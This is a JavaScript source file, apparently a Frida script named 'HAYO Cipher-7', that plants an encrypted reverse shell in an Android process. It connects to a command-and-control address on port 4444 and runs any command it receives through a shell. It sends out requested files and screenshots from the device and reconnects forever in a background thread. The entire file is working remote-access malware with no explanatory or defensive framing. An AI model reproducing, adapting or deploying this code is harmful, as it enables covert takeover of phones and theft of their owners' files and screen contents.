/* HAYO Cipher-7 — Reverse Shell (payload_reverse_shell.js)
 * ===================================================== */
var C2_HOST = "192.168.1.100";
var C2_PORT = 4444;
var RECONNECT_DELAY = 5000;
var AES_KEY = "hayo-cipher7-r3v3rs3-sh3ll-k3y!!";
function aesEncrypt(pt,key){
    try{
        var SKS=Java.use("javax.crypto.spec.SecretKeySpec");
        var IVS=Java.use("javax.crypto.spec.IvParameterSpec");
        var C=Java.use("javax.crypto.Cipher");
        var kb=Java.array('byte',stb(key.substring(0,16)));
        var iv=Java.array('byte',stb(key.substring(16,32)));
        var d=Java.array('byte',stb(pt));
        var sk=SKS.$new(kb,"AES"); var is=IVS.$new(iv);
        var ci=C.getInstance("AES/CBC/PKCS5Padding"); ci.init(1,sk,is);
        return bth(ci.doFinal(d));
    }catch(e){return bt(pt);}
}
function aesDecrypt(hex,key){
    try{
        var SKS=Java.use("javax.crypto.spec.SecretKeySpec");
        var IVS=Java.use("javax.crypto.spec.IvParameterSpec");
        var C=Java.use("javax.crypto.Cipher");
        var kb=Java.array('byte',stb(key.substring(0,16)));
        var iv=Java.array('byte',stb(key.substring(16,32)));
        var d=Java.array('byte',htb(hex));
        var sk=SKS.$new(kb,"AES"); var is=IVS.$new(iv);
        var ci=C.getInstance("AES/CBC/PKCS5Padding"); ci.init(2,sk,is);
        return bts(ci.doFinal(d));
    }catch(e){return at(hex);}
}
function stb(s){var r=[];for(var i=0;i<s.length;i++)r.push(s.charCodeAt(i)&0xff);return r;}
function bts(b){var r="";for(var i=0;i<b.length;i++)r+=String.fromCharCode(b[i]);return r;}
function bth(b){var h="";for(var i=0;i<b.length;i++){var x=b[i];if(x<0)x+=256;h+=("0"+x.toString(16)).slice(-2);}return h;}
function htb(h){var r=[];for(var i=0;i<h.length;i+=2)r.push(parseInt(h.substring(i,i+2),16));return r;}
function bt(s){try{return Java.use("android.util.Base64").encodeToString(Java.array('byte',stb(s)),0);}catch(e){return s;}}
function at(b){try{var d=Java.use("android.util.Base64").decode(b,0);return bts(d);}catch(e){return b;}}
function startRS(){
    Java.perform(function(){
        console.log("[REVSHELL] Connecting to "+C2_HOST+":"+C2_PORT);
        var S=Java.use("java.net.Socket");
        var PW=Java.use("java.io.PrintWriter");
        var BR=Java.use("java.io.BufferedReader");
        var ISR=Java.use("java.io.InputStreamReader");
        var DOS=Java.use("java.io.DataOutputStream");
        var DIS=Java.use("java.io.DataInputStream");
        var PB=Java.use("java.lang.ProcessBuilder");
        var T=Java.use("java.lang.Thread");
        function connect(){
            try{
                var sk=S.$new(C2_HOST,C2_PORT); sk.setSoTimeout(30000);
                var o=DOS.$new(sk.getOutputStream());
                var i=DIS.$new(sk.getInputStream());
                var hs=JSON.stringify({type:"reverse_shell",host:"android",platform:"android",agent:"hayo-c7"});
                o.writeUTF(aesEncrypt(hs,AES_KEY)); o.flush();
                var running=true;
                while(running){
                    try{
                        var ec=i.readUTF(); if(!ec) break;
                        var cmd=aesDecrypt(ec,AES_KEY);
                        console.log("[REVSHELL] CMD: "+cmd);
                        if(cmd==="exit"||cmd==="quit"){running=false;break;}
                        if(cmd==="ping"){o.writeUTF(aesEncrypt("pong",AES_KEY));o.flush();continue;}
                        if(cmd.startsWith("download ")){
                            var fp=cmd.substring(9).trim();
                            try{var F=Java.use("java.io.File");var fo=F.$new(fp);
                                if(fo.exists()){var FI=Java.use("java.io.FileInputStream");var fis=FI.$new(fo);
                                    var fb=Java.array('byte',new java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE,fis.available()));
                                    fis.read(fb);fis.close();var enc=bth(fb);
                                    o.writeUTF(aesEncrypt("FILE:"+fp+":"+fo.length()+":"+enc,AES_KEY));
                                }else o.writeUTF(aesEncrypt("ERROR: File not found:"+fp,AES_KEY));
                            }catch(e2){o.writeUTF(aesEncrypt("ERROR:"+e2.toString(),AES_KEY));}
                            o.flush();continue;
                        }
                        if(cmd.startsWith("screenshot")){
                            try{var R=Java.use("java.lang.Runtime");var p=R.getRuntime().exec(new Array("sh","-c","screencap -p /sdcard/c2_screen.png"));p.waitFor();
                                var F=Java.use("java.io.File");var fo=F.$new("/sdcard/c2_screen.png");
                                if(fo.exists()){var FI=Java.use("java.io.FileInputStream");var fis=FI.$new(fo);
                                    var fb=Java.array('byte',new java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE,fis.available()));
                                    fis.read(fb);fis.close();var enc=bth(fb);
                                    o.writeUTF(aesEncrypt("SCREENSHOT:"+fo.length()+":"+enc,AES_KEY));
                                }}catch(e2){o.writeUTF(aesEncrypt("SCREENSHOT_ERROR:"+e2.toString(),AES_KEY));}
                            o.flush();continue;
                        }
                        try{
                            var pb=PB.$new(new Array("sh","-c",cmd));pb.redirectErrorStream(true);
                            var proc=pb.start();var reader=BR.$new(ISR.$new(proc.getInputStream()));
                            var out="";var line;while((line=reader.readLine())!==null)out+=line+"\n";
                            proc.waitFor();if(out.length>100000)out=out.substring(0,100000)+"\n...[TRUNCATED]";
                            o.writeUTF(aesEncrypt(out,AES_KEY));
                        }catch(e2){o.writeUTF(aesEncrypt("CMD_ERROR:"+e2.toString(),AES_KEY));}
                        o.flush();
                    }catch(e){running=false;}
                }
                sk.close();
            }catch(e){console.log("[REVSHELL] Connection failed: "+e);}
        }
        var Runnable=Java.registerClass({name:"com.hayo.ReverseShellRunnable",implements:[Java.use("java.lang.Runnable")],methods:{run:function(){while(true){try{connect();}catch(e){}java.lang.Thread.sleep(RECONNECT_DELAY);}}}});
        var thread=T.$new(Runnable.$new());thread.start();
        console.log("[REVSHELL] Thread started");
    });
}
setTimeout(startRS,2000);
